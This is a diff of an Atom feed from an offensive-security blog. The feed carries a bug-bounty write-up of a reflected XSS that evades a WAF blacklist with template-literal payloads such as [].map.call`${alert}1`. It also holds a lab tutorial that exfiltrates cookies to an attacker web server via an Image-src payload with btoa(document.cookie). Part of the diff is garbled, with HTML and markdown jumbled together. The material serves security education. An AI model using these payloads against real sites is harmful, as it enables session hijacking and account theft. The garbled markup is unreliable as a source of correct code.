@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2023-03-12T18:18:16+01:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>HackCommander</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">Reflected XSS bypassing a 302 Security Redirect due to the presence of Javascript function calls</title><link href="https://hackcommander.github.io/bug-bounty-3/" rel="alternate" type="text/html" title="Reflected XSS bypassing a 302 Security Redirect due to the presence of Javascript function calls" /><published>2023-03-06T00:00:00+01:00</published><updated>2023-03-06T00:00:00+01:00</updated><id>https://hackcommander.github.io/bug-bounty-3</id><content type="html" xml:base="https://hackcommander.github.io/bug-bounty-3/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2023-03-12T19:55:06+01:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>HackCommander</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">Reflected XSS bypassing a 302 Security Redirect due to the presence of Javascript function calls</title><link href="https://hackcommander.github.io/bug-bounty-3/" rel="alternate" type="text/html" title="Reflected XSS bypassing a 302 Security Redirect due to the presence of Javascript function calls" /><published>2023-03-06T00:00:00+01:00</published><updated>2023-03-06T00:00:00+01:00</updated><id>https://hackcommander.github.io/bug-bounty-3</id><content type="html" xml:base="https://hackcommander.github.io/bug-bounty-3/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
@@ -27,6 +27,12 @@
 
 &lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path /home/user/.config/amass/config.ini, you can use the following command&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -41,6 +47,12 @@
 &lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;
 
 &lt;p&gt;I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;gau www.example.com | kxss
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -88,6 +100,12 @@
 
 &lt;p&gt;Before injecting any Javascript payload, let’s see if I can close the &lt;em&gt;push&lt;/em&gt; method and inject some string into the script. Sending a payload like the following&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});HackCommander;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -96,6 +114,12 @@
 &lt;p&gt;&lt;img src=&quot;/assets/images/2023-03-06-bug-bounty-3/repeater-exploitation-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;So far so good! Then I tried to send the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});alert(1);&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -107,6 +131,12 @@
 &lt;p&gt;The server didn’t like something because when I changed the &lt;em&gt;HackCommander&lt;/em&gt; payload to the Javascript payload &lt;em&gt;alert(1)&lt;/em&gt; it returned a &lt;em&gt;302 Security Redirect&lt;/em&gt;. It is possible that there was some WAF or server-side configuration implemented to detect potentially dangerous payloads, in this case Javascript function calls.&lt;/p&gt;
 
 &lt;p&gt;Javascript allows to use `` instead of () to call functions such as alert (&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals&quot;&gt;Template literals&lt;/a&gt;), that is, it allows to use calls of the form alert`1`. Not all security measures take into account this flexibility of Javascript and only blacklist expressions of the form &lt;em&gt;string1(string2)&lt;/em&gt;. Therefore, a typical bypass for this type of situation is to change the () to ``, that is, use a payload of the type&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});alert`1`;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -122,6 +152,12 @@
 &lt;p&gt;&lt;a href=&quot;https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses&quot;&gt;The seventh way to call a JavaScript function without parentheses (PortSwigger)&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;After taking a look at all the proposed payloads, I thought that the seventh method discovered might fit my needs. Therefore I sent the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});[].map.call`${alert}1`;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -152,12 +188,24 @@
 
 &lt;p&gt;If you remember, in the previous section, the following payload&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});alert(1);&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;returned a &lt;em&gt;302 Security Redirect&lt;/em&gt;.&lt;/p&gt;
 
 &lt;p&gt;But… What is the origin of this redirection? The &lt;em&gt;alert&lt;/em&gt; string? The brackets? The combination of both?. The following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});HackCommander(1);&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -167,6 +215,12 @@
 &lt;p&gt;&lt;img src=&quot;/assets/images/2023-03-06-bug-bounty-3/repeater-demonstration-blacklist-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;so… the problem was the &lt;em&gt;alert&lt;/em&gt; string? To solve this question I sent the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});alert;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -179,12 +233,24 @@
 
 &lt;p&gt;So what I think is causing the redirection is some regex-like mechanism that rejects payloads of the type &lt;em&gt;keyword(inputParams)&lt;/em&gt; or &lt;em&gt;keyword`inputParams`&lt;/em&gt; (calls to Javascript functions and methods, in general) where &lt;em&gt;keyword&lt;/em&gt; is any element of a blacklist composed of Javascript method names, a blacklist of the type&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert
 prompt
 ...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;So the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;});[].map.call`${alert}1`;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -265,61 +331,82 @@ prompt
   &lt;li&gt;
     &lt;p&gt;Suposing that the IP of the &lt;em&gt;Metasploitable 2&lt;/em&gt; machine is 192.168.240.129 you can access to the web from your Kali through the URL&lt;/p&gt;
 
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; http://192.168.240.129/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;In the main page select the option &lt;em&gt;DVWA&lt;/em&gt;, wich is the acronym of &lt;em&gt;Damn Vulnerable Web Application&lt;/em&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/main-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Log in with the credentials admin:password.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Configure the &lt;em&gt;Security Level&lt;/em&gt; to &lt;em&gt;low&lt;/em&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/dvwa-security.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;and click &lt;em&gt;Submit&lt;/em&gt;.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;In the left panel select the option &lt;em&gt;XSS reflected&lt;/em&gt; and write the payload&lt;/p&gt;
-
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;in the text box as follows&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/xss-reflected-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;and clicking on &lt;em&gt;Submit&lt;/em&gt; you will see an alert like the following&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/xss-reflected-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;So there is an HTML context reflected XSS through GET method in the URL&lt;/p&gt;
-
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;To show how the PHP info page can be used to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag, we must first have at least one cookie with the &lt;em&gt;HttpOnly&lt;/em&gt; flag set to &lt;em&gt;true&lt;/em&gt;. In &lt;em&gt;Metasploitable 2&lt;/em&gt; is not set by defaul, that’s why we have to access to the cookies in the browser (Firefox in my case) and set, for example, the &lt;em&gt;HttpOnly&lt;/em&gt; of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie to &lt;em&gt;true&lt;/em&gt;, as you can see in the following screenshot&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/cookies-settings.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+    &lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+ Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
   &lt;/li&gt;
 &lt;/ol&gt;
+&lt;p&gt;&amp;lt;/div&amp;gt;&lt;/p&gt;
 
-&lt;div id=&quot;section-id-2&quot; /&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    http://192.168.240.129/
+    ```
 
-&lt;h2 id=&quot;2-hands-on&quot;&gt;2. Hands-on!&lt;/h2&gt;
+7. In the main page select the option *DVWA*, wich is the acronym of *Damn Vulnerable Web Application*
 
-&lt;div id=&quot;section-id-2-1&quot; /&gt;
+   ![](/assets/images/2022-11-12-pentesting-article-1/main-page.png)
 
-&lt;h2 id=&quot;21-trying-to-exfiltrate-the-cookies-through-the-usual-method&quot;&gt;2.1. Trying to exfiltrate the cookies through the usual method&lt;/h2&gt;
+8. Log in with the credentials admin:password.
 
-&lt;p&gt;A very common way to access the cookies via Javascript is through the &lt;em&gt;document&lt;/em&gt; property &lt;em&gt;cookie&lt;/em&gt;. So if you write the payload&lt;/p&gt;
+9. Configure the *Security Level* to *low*
 
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+   ![](/assets/images/2022-11-12-pentesting-article-1/dvwa-security.png)
+   
+   and click *Submit*.
+
+10. In the left panel select the option *XSS reflected* and write the payload
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;code-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;copy-code-button&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    Copy code to clipboard
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+
+    ```html
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+    ```
+
+    in the text box as follows
+
+    ![](/assets/images/2022-11-12-pentesting-article-1/xss-reflected-form.png)
+
+    and clicking on *Submit* you will see an alert like the following
+
+    ![](/assets/images/2022-11-12-pentesting-article-1/xss-reflected-alert.png)
+
+    So there is an HTML context reflected XSS through GET method in the URL
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;code-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;copy-code-button&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    Copy code to clipboard
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+
+    ```html
+    http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
+    ```
+
+11. To show how the PHP info page can be used to bypass the *HttpOnly* flag, we must first have at least one cookie with the *HttpOnly* flag set to *true*. In *Metasploitable 2* is not set by defaul, that&apos;s why we have to access to the cookies in the browser (Firefox in my case) and set, for example, the *HttpOnly* of the *PHPSESSID* cookie to *true*, as you can see in the following screenshot
+
+    ![](/assets/images/2022-11-12-pentesting-article-1/cookies-settings.png)
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;section-id-2&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+## 2. Hands-on!
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;section-id-2-1&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+## 2.1. Trying to exfiltrate the cookies through the usual method
+
+A very common way to access the cookies via Javascript is through the *document* property *cookie*. So if you write the payload
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;code-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;copy-code-button&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    Copy code to clipboard
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+
+```html
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and you click on &lt;em&gt;Submit&lt;/em&gt;, you are going to see all your cookies in the screen… or not?&lt;/p&gt;
@@ -338,6 +425,12 @@ prompt
 
 &lt;p&gt;Take a look at the following code&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -348,6 +441,12 @@ prompt
 
 &lt;p&gt;So if we set up a web server in our Kali through the command&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;python3 -m http.server 80
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -356,6 +455,12 @@ prompt
 &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/python-web-server.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;and we write the payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -377,6 +482,12 @@ prompt
 &lt;p&gt;Ok, we can’t get the cookies from the &lt;em&gt;document&lt;/em&gt; object. Is there another place where we can get the cookies?&lt;/p&gt;
 
 &lt;p&gt;In &lt;em&gt;Metasploitable 2&lt;/em&gt; there is a PHP info page disclosure in the path &lt;em&gt;/dvwa/phpinfo&lt;/em&gt;. In my case, it’s in the URL&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/phpinfo
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -405,6 +516,12 @@ prompt
 
 &lt;p&gt;That is what the following code does&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
